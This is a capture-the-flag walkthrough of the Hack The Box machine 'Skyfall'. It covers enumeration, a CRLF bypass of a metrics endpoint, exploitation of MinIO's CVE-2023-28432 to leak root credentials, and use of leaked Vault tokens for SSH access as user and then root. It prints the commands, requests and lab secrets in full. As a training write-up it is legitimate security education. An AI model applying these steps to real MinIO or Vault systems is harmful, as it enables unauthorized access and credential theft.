# Insane\_machines

## Skyfall

### Reco

#### nmap

`nmap -sVC 10.10.11.254`

<figure><img src=".gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>



#### fuzzing

`dirb http://10.10.11.254 -w /usr/share/wordlists/dirb/common.txt`

* nothing interesting

`ffuf -u http://10.10.11.254/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt`

* nothing interesting

<figure><img src=".gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

`gobuster dir -u http://10.10.11.254 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`

* <mark style="color:purple;">**subdomain found**</mark>
  * demo
    * add to /etc/hosts
      * 10.10.11.254 demo.skyfall.htb skyfall.htb

#### website

* no sub-page to be found, just one page website
* F12
  * Console
    * several problems with Google maps API
    *

        <figure><img src=".gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>


    *

        <figure><img src=".gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

### Weaponisation

#### demo.skyfall.htb

<figure><img src=".gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>

* demo login credentials
  * guest:guest

<figure><img src=".gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

* obtained info:
  * powered by Flask
  * Files -> Welcome.pdf
    * they encourage users to expand community with Feedback & Escalate submissions...
      * could be used for serving exploits
    * Files -> we can upload own files
  * Beta Features are forbidden for guest account
  * URL Fetch
    * we can fetch from URL

### Exploitation

* tried some file uploads with reverse shell exploits inside PDF, but without success

#### Metrics

![](<.gitbook/assets/image (136).png>)&#x20;

* cant be accessed directly
* lets add CRLF payload to URL
  * [http://demo.skyfall.htb/metrics%0a](http://demo.skyfall.htb/metrics)
    * we are in
    *

        <figure><img src=".gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>


* in the metrics list, we can find cluster endpoint URL
  * &#x20;[http://prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster](http://prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster)
  *

      <figure><img src=".gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>


  * On Researching `/minio/v2/metrics/cluster` I get to know about an Information Disclosure Vulnerability
    * [CVE-2023–28432](https://nvd.nist.gov/vuln/detail/cve-2023-28432)

#### CVE for Info Disclosure Vuln

* if the vuln is present -> response will include all env vars, including MINIO\_SECRET\_KEY + MINIO\_ROOT\_PW
* lets try that
  * add subdomain to /etc/hosts...
    * access cluster page
      *

          <figure><img src=".gitbook/assets/image (142).png" alt=""><figcaption></figcaption></figure>


      * run BurpSuite
        * edit GET to POST by the image below
        * we obtained ROOT PW + USER
          *

              <figure><img src=".gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>

```html
"MINIO_ROOT_PASSWORD":"GkpjkmiVmpFuL2d3oRx0",
"MINIO_ROOT_PASSWORD_FILE":"secret_key",
"MINIO_ROOT_USER":"5GrE1B2YGGyZzNHZaIww",
"MINIO_ROOT_USER_FILE":"access_key",
"MINIO_SECRET_KEY_FILE":"secret_key"
```

### User flag

#### Minio tool

* download and install minio tool

```bash
curl https://dl.min.io/client/mc/release/linux-amd64/mc
--create-dirs
-o $HOME/minio-binaries/mc

chmod +x $HOME/minio-binaries/mc 
export PATH=$PATH:$HOME/minio-binaries/
```

<figure><img src=".gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>

* After Installing the tool, use the below command to set an alias named “`myminio`” for connecting to an S3-compatible storage service hosted at [`http://prd23-s3-backend.skyfall.htb`](http://prd23-s3-backend.skyfall.htb/) with the provided access and secret keys.&#x20;
  * The alias makes it easy to interact with this storage service using the `mc` tool. **(`Make sure to Replace the ACCESS_KEY and SECRET_KEY`)**
* mc alias set myminio [http://prd23-s3-backend.skyfall.htb](http://prd23-s3-backend.skyfall.htb/) ACCESS\_KEY SECRET\_KEY

<figure><img src=".gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

Now, lets list all the files in the Service using:

* `mc ls — recursive — versions myminio`
*

    <figure><img src=".gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>
* there is home\_backup file
  * download it and examine files

```bash
mc cp --recursive myminio/askyy/home_backup.tar.gz ./home_backup.tar.gz
tar -xzvf home_backup.tar.gz
cat .bashrc
```

<figure><img src=".gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

* found a Vault API address and Vault Token in `.bashrc file`

<figure><img src=".gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

<pre><code><strong>VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb"
</strong><strong>VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
</strong></code></pre>

Vault

* download & login via Vault

```bash
wget https://releases.hashicorp.com/vault/1.15.5/vault_1.15.5_linux_amd64.zip
unzip vault_1.15.5_linux_amd64.zip
export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"
./vault login
```

<figure><img src=".gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>

* `./vault token capabilities ssh/roles`
  * This command checks the capabilities of the token with regard to the SSH roles in the Vault. In this case, the capabilities include the ability to list.

<figure><img src=".gitbook/assets/image (151).png" alt=""><figcaption></figcaption></figure>

* `./vault list ssh/roles`
  * This command lists the available SSH roles in the Vault. It displays the roles that have been configured for SSH authentication.

<figure><img src=".gitbook/assets/image (152).png" alt=""><figcaption></figcaption></figure>

Now use the below command, which initiates SSH session in one-time password (OTP) mode for a specific role named `dev_otp_key_role`.&#x20;

The connection is made to the SSH server with the username `askyy` at the specified IP address (`HTB_IP`). Additionally, the option `-strict-host-key-checking=no` is used to disable strict host key checking during the connection.

```bash
./vault ssh -role dev_otp_key_role -mode OTP -strict-host-key-checking=no askyy@10.10.11.254
```

<figure><img src=".gitbook/assets/image (153).png" alt=""><figcaption></figcaption></figure>

### Root flag

#### obtain Master token

`sudo -l`

<figure><img src=".gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

* lets try running the command (as sudo)

<figure><img src=".gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>

* looks like it works, but debug details must be activated to see details...

`rm -rf debug.log`\
`touch debug.log`

* create it in askyys home dir (because of writing permissions)
* run the command again
  * we can see some more details now
  * it executes the `vault-unseal` with elevated privileges using `sudo`. The `-c` option specifies a configuration file (`/etc/vault-unseal.yaml`), and `-vd` enables verbose mode for debugging.

<figure><img src=".gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>

`cat debug.log`

<figure><img src=".gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>

* master token found!
  * **hvs.I0ewVsmaKU1SwVZAKR3T0mmG**
* lets vault login again, but now as admin role with obtained master token

#### Configure root vault access

```bash
export VAULT_TOKEN="hvs.I0ewVsmaKU1SwVZAKR3T0mmG"
```

```bash
./vault ssh -role admin_otp_key_role -mode OTP -strict-host-key-checking=no root@10.10.11.254
```

<figure><img src=".gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>
